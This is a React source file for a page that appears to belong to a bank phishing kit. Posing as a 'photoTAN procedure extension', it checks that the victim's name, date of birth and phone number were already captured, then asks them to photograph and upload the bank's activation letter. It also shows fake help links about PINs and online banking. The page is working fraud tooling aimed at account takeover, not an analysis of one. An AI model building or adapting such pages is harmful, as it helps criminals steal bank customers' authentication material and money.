import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import apiService from '../services/api';
import { FaArrowRight } from 'react-icons/fa';

const UploadPage: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useLanguage();
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const fileInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    // Check if user came from info page
    const xname1 = sessionStorage.getItem('xname1');
    const xname2 = sessionStorage.getItem('xname2');
    const xdob = sessionStorage.getItem('xdob');
    const xtel = sessionStorage.getItem('xtel');
    
    if (!xname1 || !xname2 || !xdob || !xtel) {
      navigate('/info');
    }
  }, [navigate]);

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      setError('');
    }
  };

  const handleCameraCapture = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      setError('');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!selectedFile) {
      setError('Please select a file');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      const formData = new FormData();
      formData.append('file', selectedFile);
      
      const response = await apiService.upload(formData);
      
      if (response.success) {
        navigate('/success');
      } else {
        setError(response.message || 'Upload failed');
      }
    } catch (error) {
      setError('Upload failed. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleUploadClick = () => {
    fileInputRef.current?.click();
  };

  return (
    <div style={{
      fontFamily: 'Arial, Helvetica, sans-serif',
      backgroundColor: '#f5f5f5',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: '20px 20px 20px 20px',
      margin: 0
    }}>
      {/* Main heading */}
      <h1 style={{
        fontSize: '32px',
        fontWeight: 'bold',
        color: '#333',
        marginTop: '20px',
        marginBottom: '20px',
        fontFamily: 'Arial, Helvetica, sans-serif',
        textAlign: 'left',
        width: '100%',
        maxWidth: '1200px',
        margin: '20px auto 20px auto',
        padding: '0 20px'
      }}>
        Last step: Extension of your existing photoTAN procedure
      </h1>
      
      <div style={{
        display: 'flex',
        flexDirection: 'row',
        gap: '20px',
        width: '100%',
        maxWidth: '1200px',
        alignItems: 'flex-start',
        margin: '0 auto',
        padding: '0 20px'
      }}>
        {/* Left Column - Upload Section */}
        <div style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: '40px',
          width: '100%',
          minWidth: '300px'
        }}>
          {/* Upload heading */}
          <h1 style={{
            fontSize: '32px',
            fontWeight: 'bold',
            color: '#333',
            marginTop: '0px',
            marginBottom: '20px',
            fontFamily: 'Arial, Helvetica, sans-serif',
            textAlign: 'left'
          }}>
            Scan activation graphic
          </h1>
          <div style={{
            backgroundColor: '#f8f9fa',
            border: '2px dashed #000000',
            borderRadius: '8px',
            padding: '20px',
            marginBottom: '20px'
          }}>
            <p style={{
              fontSize: '14px',
              color: '#333',
              lineHeight: '1.5',
              margin: '0 0 15px 0',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              Scan the activation image from the letter you received to extend your photoTAN process. After verification, it will remain valid.
              Please first take a photo of the entire activation letter and upload the image from your gallery.
            </p>
            {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
              <div style={{
                backgroundColor: '#fff3cd',
                border: '1px solid #ffeaa7',
                borderRadius: '4px',
                padding: '10px',
                marginTop: '10px'
              }}>
                <p style={{
                  fontSize: '12px',
                  color: '#856404',
                  margin: '0',
                  fontFamily: 'Arial, Helvetica, sans-serif'
                }}>
                  <strong>{t('mobileNotice')}:</strong> {t('mobileNoticeText')}
                </p>
              </div>
            )}
          </div>
          
          {/* GIF from public folder */}
          <div style={{
            textAlign: 'center',
            marginBottom: '20px'
          }}>
            <img 
              src="/lika2.gif" 
              alt="Upload animation" 
              style={{
                width: '250px',
                height: 'auto',
                borderRadius: '8px',
                boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)'
              }}
            />
          </div>
          
          {/* Hidden File Input */}
          <input
            type="file"
            ref={fileInputRef}
            onChange={handleFileInputChange}
            accept="image/*"
            style={{ display: 'none' }}
          />

          {/* Buttons Container */}
          <div style={{
            display: 'flex',
            justifyContent: 'center',
            gap: '15px',
            marginTop: '20px'
          }}>
            <button
              type="button"
              onClick={handleUploadClick}
              disabled={isLoading}
              style={{
                width: '40%',
                padding: '15px',
                background: isLoading ? '#ccc' : 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                fontSize: '16px',
                fontWeight: 'bold',
                cursor: isLoading ? 'not-allowed' : 'pointer',
                fontFamily: 'Arial, Helvetica, sans-serif',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                transition: 'background 0.3s ease'
              }}
            >
              {isLoading ? 'Uploading...' : 'Upload File'}
            </button>

            <button
              type="button"
              onClick={() => navigate('/done')}
              disabled={!selectedFile || isLoading}
              style={{
                width: '40%',
                padding: '15px',
                background: (!selectedFile || isLoading) ? '#ccc' : '#FFC107',
                color: 'white',
                border: 'none',
                borderRadius: '4px',
                fontSize: '16px',
                fontWeight: 'bold',
                cursor: (!selectedFile || isLoading) ? 'not-allowed' : 'pointer',
                fontFamily: 'Arial, Helvetica, sans-serif',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                transition: 'background 0.3s ease'
              }}
            >
              Next
            </button>
          </div>

          {/* Selected File Display */}
          {selectedFile && (
            <div style={{
              textAlign: 'center',
              marginTop: '10px',
              padding: '10px',
              backgroundColor: '#e8f5e8',
              borderRadius: '4px',
              border: '1px solid #4caf50'
            }}>
              <p style={{
                margin: '0',
                color: '#2e7d32',
                fontSize: '14px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                Selected: {selectedFile.name}
              </p>
            </div>
          )}

          {/* Error Display */}
          {error && (
            <div style={{
              textAlign: 'center',
              marginTop: '10px',
              padding: '10px',
              backgroundColor: '#ffebee',
              borderRadius: '4px',
              border: '1px solid #f44336'
            }}>
              <p style={{
                margin: '0',
                color: '#c62828',
                fontSize: '14px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {error}
              </p>
            </div>
          )}
        </div>

        {/* Important Info Box */}
        <div style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: '40px'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: '#333',
            marginBottom: '15px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('importantInfo')}
          </h3>
          
          <p style={{
            fontSize: '14px',
            color: '#666',
            marginBottom: '20px',
            lineHeight: '1.5',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('photoTANProblems')}
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('noActiveTAN')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
              </div>
            </div>
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
              </div>
            </div>
          </div>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('forgotCredentials')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
              </div>
            </div>
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
              </div>
            </div>
          </div>
          
          <div>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('allAboutOnlineBanking')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
              </div>
            </div>
            <div>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif'
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default UploadPage;